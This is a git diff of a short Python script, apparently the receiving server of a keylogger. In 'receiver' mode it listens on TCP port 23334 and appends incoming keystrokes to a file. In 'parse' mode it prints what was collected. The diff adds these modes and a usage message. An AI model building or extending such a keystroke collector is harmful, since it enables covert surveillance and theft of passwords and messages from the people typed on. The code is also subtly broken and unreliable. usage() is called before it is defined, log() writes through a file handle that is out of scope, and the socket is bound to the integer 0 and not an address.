@@ -9,19 +9,23 @@ purple="\033[0;95m"
 cyan="\033[0;36m"
 white="\033[0;97m"
 
-save=''
+if len(sys.argv) < 3:
+	usage()
+
+
 shift=False
 unknown=False
 
+
+def usage():
+	print ("Usage:\n     csi.py receiver keystrokes.txt\n     csi.py parse keystrokes.txt")
+	exit(1)
 def log(key):
-	if shift == True:
-		if key == "":
-			return
-		if key == "2":
-	if key == "":
-		shift=True
+	print (key)
+	save.write(key)
 
 def receiver():
+	save=open(sys.argv[2], "ab")
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	sock.bind((0, 23334))
 	sock.listen()
@@ -36,5 +40,14 @@ def receiver():
 		log(ktx)
 
 
-save=open("test.txt", "w")
 
+def parser():
+	save=open(sys.argv[2], "r", encoding="unicode_escape")
+	print (save.read())
+
+if sys.argv[1] == "receiver" and sys.argv[2] != '':
+	receiver()
+elif sys.argv[1] == "parse" and sys.argv[2] != '':
+	parser()
+else:
+	usage()
